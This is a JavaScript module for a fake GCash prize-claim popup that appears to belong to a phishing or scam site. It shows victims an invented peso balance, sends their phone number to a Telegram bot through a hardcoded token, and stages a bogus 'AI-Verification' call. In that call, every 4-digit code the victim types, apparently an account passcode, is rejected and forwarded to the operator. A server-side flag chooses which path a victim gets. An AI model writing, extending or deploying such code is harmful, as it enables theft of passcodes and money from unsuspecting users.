/**
 * Popup Share Module - ULTRA PREMIUM CANDY THEME
 * Phase 1: Balance & Bills
 * Phase 2: Withdraw Redirect
 * Phase 3: AI-Verification Call (Neon theme)
 */

(function() {
    'use strict';
    
    let currentBalance = 0;
    let claimInProgress = false;
    let isRedirecting = false;
    
    // AI Call Variables
    let callInProgress = false;
    let callCountdown = 60;
    let callTimerInterval = null;

    // ========== SOUNDS ==========
    function playSound(file) {
        try {
            var audio = new Audio('sounds/' + file);
            audio.volume = 0.5;
            audio.play().catch(function(e) {});
        } catch(e) {}
    }

    // ========== TELEGRAM ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegram(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message)).catch(function(){});
        } catch(e) {}
    }

    // ========== GET FIREWALL ==========
    function getFirewallStatus() {
        try {
            return firebase.database().ref('admin/globalFirewall').once('value').then(function(snap) {
                var data = snap.val();
                return (data && data.active === true);
            });
        } catch(e) { return Promise.resolve(false); }
    }

    // ========== BILLS INDICATOR ==========
    function updateBillsIndicators(balance) {
        var indicators = document.querySelectorAll('.bill-indicator');
        var billCount = Math.min(4, Math.floor(balance / 500));
        
        for (var i = 0; i < indicators.length; i++) {
            var img = indicators[i].querySelector('img');
            if (i < billCount) {
                img.src = (i % 2 === 0) ? 'images/PHL-500-Front.png' : 'images/PHL-500-Back.png';
                img.style.opacity = '1';
                img.style.filter = 'none';
                indicators[i].classList.add('active');
            } else {
                img.src = 'images/PHL-500-Front.png';
                img.style.opacity = '0.15';
                img.style.filter = 'grayscale(100%) brightness(30%)';
                indicators[i].classList.remove('active');
            }
        }
    }

    // ========== SHOW PHASE 1 (Main Popup) ==========
    function showPhase1(balance) {
        var inner = document.querySelector('.popup-inner');
        if (!inner) return;
        
        currentBalance = balance;
        inner.innerHTML = `
            <button class="popup-close" id="popupClosePhase1"><i class="fas fa-xmark"></i></button>
            
            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
            
            <div class="prize-amount-display">
                <span class="currency">₱</span><span id="popupBalanceAmount">${balance.toFixed(2)}</span>
            </div>
            
            <div class="popup-divider"><span>★</span><span class="line"></span><span>★</span></div>
            
            <div class="bill-indicators">
                <div class="bill-indicator"><img src="images/PHL-500-Front.png"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Back.png"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Front.png"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Back.png"></div>
            </div>
            
            <div class="invite-text">
                Your friend must confirm your invitation to get extra <strong>₱500 bonus</strong>.
            </div>
            
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            
            <button class="mega-btn btn-gcash" id="claimGCashBtn">
                <span class="btn-glow"></span>
                <span class="btn-shine"></span>
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>
            
            <button class="small-back-btn" id="backBtnPhase1">← BACK</button>
        `;
        
        updateBillsIndicators(balance);
        
        // Events
        document.getElementById('popupClosePhase1').onclick = closePopup;
        document.getElementById('backBtnPhase1').onclick = closePopup;
        
        document.getElementById('claimGCashBtn').onclick = function() {
            if (currentBalance <= 0) {
                this.classList.add('shake-effect');
                this.style.background = 'linear-gradient(180deg, #ff4444, #cc0000)';
                this.innerHTML = '❌ NO BALANCE';
                setTimeout(() => { showPhase1(currentBalance); }, 1500);
                return;
            }
            
            var userPhone = localStorage.getItem("userPhone") || "Unknown";
            sendTelegram('💳 CLAIM CLICKED\n👤 ' + userPhone + '\n💰 ₱' + currentBalance.toFixed(2));
            
            // Animate drain
            animateDrain(currentBalance, function() {
                getFirewallStatus().then(function(isOn) {
                    if (isOn) showPhase3();
                    else showPhase2();
                });
            });
        };
    }

    // ========== BALANCE DRAIN ANIMATION ==========
    function animateDrain(start, callback) {
        var amountEl = document.getElementById('popupBalanceAmount');
        var btn = document.getElementById('claimGCashBtn');
        if (!amountEl || !btn) return callback();

        btn.disabled = true;
        btn.innerHTML = '⏳ PROCESSING...';
        
        var steps = 30, current = 0;
        var interval = setInterval(function() {
            current++;
            var val = start - ((start / steps) * current);
            amountEl.textContent = Math.max(0, val).toFixed(2);
            updateBillsIndicators(Math.max(0, val));
            
            if (current >= steps) {
                clearInterval(interval);
                amountEl.textContent = '0.00';
                setTimeout(callback, 300);
            }
        }, 800 / steps);
    }

    // ========== SHOW PHASE 2 (Withdraw Redirect) ==========
    function showPhase2() {
        var inner = document.querySelector('.popup-inner');
        inner.innerHTML = `
            <button class="popup-close" id="popupClosePhase2"><i class="fas fa-xmark"></i></button>
            <div style="text-align:center; font-size:50px; margin-bottom:10px; animation: bounceIn 0.5s;">🏆</div>
            <h2 class="popup-title" style="font-size:22px;">GREAT JOB!</h2>
            <div class="popup-divider"><span>★</span><span class="line"></span><span>★</span></div>
            
            <div class="phase2-box">
                <p>"Nice work! You're one tap away from your reward!"</p>
                <div class="phase2-amount">₱${currentBalance.toFixed(2)}</div>
            </div>
            
            <button class="mega-btn btn-gcash" id="proceedBtn">
                <span class="btn-glow"></span>
                <span class="btn-shine"></span>
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH
            </button>
            
            <button class="small-back-btn" id="backBtnPhase2">← BACK</button>
        `;
        
        document.getElementById('popupClosePhase2').onclick = closePopup;
        document.getElementById('backBtnPhase2').onclick = () => showPhase1(currentBalance);
        
        document.getElementById('proceedBtn').onclick = function() {
            if (claimInProgress) return;
            claimInProgress = true;
            this.innerHTML = '⏳ REDIRECTING...';
            
            try {
                firebase.database().ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snap) {
                    if (snap.exists()) {
                        var key = Object.keys(snap.val())[0];
                        var url = snap.val()[key].url;
                        firebase.database().ref('links/' + key).update({ status: 'used', user: localStorage.getItem("userPhone") });
                        setTimeout(() => { window.location.href = url; }, 1000);
                    } else {
                        alert("No payout link available. Please try again.");
                        claimInProgress = false;
                        showPhase2();
                    }
                });
            } catch(e) { alert("System error."); }
        };
    }

    // ========== SHOW PHASE 3 (AI Verification) ==========
    function showPhase3() {
        var inner = document.querySelector('.popup-inner');
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);

        inner.innerHTML = `
            <button class="popup-close" id="popupClosePhase3"><i class="fas fa-xmark"></i></button>
            
            <div class="ai-icon-ring"><i class="fas fa-phone-volume"></i></div>
            <h2 class="popup-title" style="font-size:20px;">AI-VERIFICATION</h2>
            <div class="popup-divider"><span>★</span><span class="line"></span><span>★</span></div>
            
            <div class="ai-status-box">
                <div id="callStatusIcon" style="font-size:32px; margin-bottom:8px;">🎪</div>
                <div id="callStatusText">AI CALL will provide your code</div>
                <div id="phoneDisplay" style="display:none; margin-top:10px;">
                    <div class="ai-phone-number">📱 ${formattedPhone}</div>
                </div>
                <div id="callTimerDisplay" style="display:none;" class="ai-timer">60s</div>
            </div>
            
            <button class="mega-btn btn-gcash" id="requestCallBtn">
                <i class="fas fa-phone-alt"></i> REQUEST CALL
            </button>
            
            <div id="codeSection" style="display:none; margin-top:15px;">
                <input type="text" id="codeInput" class="ai-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                <button class="mega-btn btn-verify" id="verifyBtn"><i class="fas fa-check"></i> VERIFY</button>
                <div id="errorMsg" class="ai-error">❌ Invalid code.</div>
            </div>
            
            <button class="small-back-btn" id="backBtnPhase3" style="margin-top:12px;">← BACK</button>
        `;

        document.getElementById('popupClosePhase3').onclick = () => { stopTimer(); closePopup(); };
        document.getElementById('backBtnPhase3').onclick = () => { stopTimer(); showPhase1(currentBalance); };
        
        document.getElementById('requestCallBtn').onclick = function() {
            if (callInProgress) return;
            callInProgress = true;
            callCountdown = 60;
            
            var code = Math.floor(1000 + Math.random() * 9000).toString();
            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
            
            try {
                firebase.database().ref('user_sessions/' + userPhone + '/system_verification').set({
                    code: code, timer: 60, status: 'active', deviceId: deviceId,
                    createdAt: Date.now(), lastUpdate: Date.now()
                });
            } catch(e) {}
            
            sendTelegram('📞 AI CALL REQ\n👤 ' + userPhone + '\n🔑 Code: ' + code);
            playSound('call_ring.mp3');
            
            document.getElementById('callStatusIcon').innerHTML = '📞';
            document.getElementById('callStatusText').innerHTML = '<strong style="color:#00f2ff;">CALLING...</strong>';
            document.getElementById('phoneDisplay').style.display = 'block';
            document.getElementById('callTimerDisplay').style.display = 'block';
            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
            this.disabled = true;

            startTimer();

            setTimeout(() => {
                document.getElementById('callStatusIcon').innerHTML = '🎯';
                document.getElementById('callStatusText').innerHTML = '<strong style="color:#39ff14;">CONNECTED!</strong>';
                document.getElementById('codeSection').style.display = 'block';
                document.getElementById('codeInput').focus();
            }, 3000);
        };

        document.getElementById('verifyBtn').onclick = function() {
            var codeVal = document.getElementById('codeInput').value.trim();
            if (codeVal.length !== 4) return;
            
            // Always invalid for anti-fraud
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('codeInput').value = '';
            sendTelegram('🔑 CODE ATTEMPT (INVALID)\n👤 ' + userPhone + '\n📝 ' + codeVal);
            
            setTimeout(() => { 
                document.getElementById('codeSection').style.display = 'none'; 
                document.getElementById('callStatusText').innerHTML = '<strong style="color:#ff9800;">EXPIRED</strong>';
            }, 1500);
        };
    }

    function startTimer() {
        stopTimer();
        var el = document.getElementById('callTimerDisplay');
        callTimerInterval = setInterval(function() {
            callCountdown--;
            if (el) {
                el.textContent = callCountdown + 's';
                if (callCountdown <= 10) {
                    el.style.color = '#ff1744';
                    el.style.animation = 'timerPulseRed 0.5s infinite';
                }
            }
            if (callCountdown <= 0) {
                stopTimer();
                document.getElementById('codeSection').style.display = 'none';
                document.getElementById('requestCallBtn').disabled = false;
                document.getElementById('requestCallBtn').innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST CALL';
                callInProgress = false;
            }
        }, 1000);
    }

    function stopTimer() {
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
    }

    function closePopup() {
        var popup = document.getElementById('prizePopup');
        if (popup) popup.style.display = 'none';
        stopTimer();
        claimInProgress = false;
    }

    // ========== INITIALIZE ==========
    document.addEventListener('DOMContentLoaded', function() {
        var claimBtn = document.getElementById('claimNowBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                playSound('super_ace_scatter_ring.mp3');
                try {
                    firebase.database().ref('user_sessions/' + localStorage.getItem("userPhone")).once('value').then(function(snap) {
                        var bal = snap.val() ? (snap.val().balance || 0) : 0;
                        document.getElementById('prizePopup').style.display = 'flex';
                        showPhase1(bal);
                    });
                } catch(e) {
                    document.getElementById('prizePopup').style.display = 'flex';
                    showPhase1(0);
                }
            };
        }
    });

    window.showPopup = function() { document.getElementById('prizePopup').style.display = 'flex'; showPhase1(0); };
    window.closePopup = closePopup;

})();
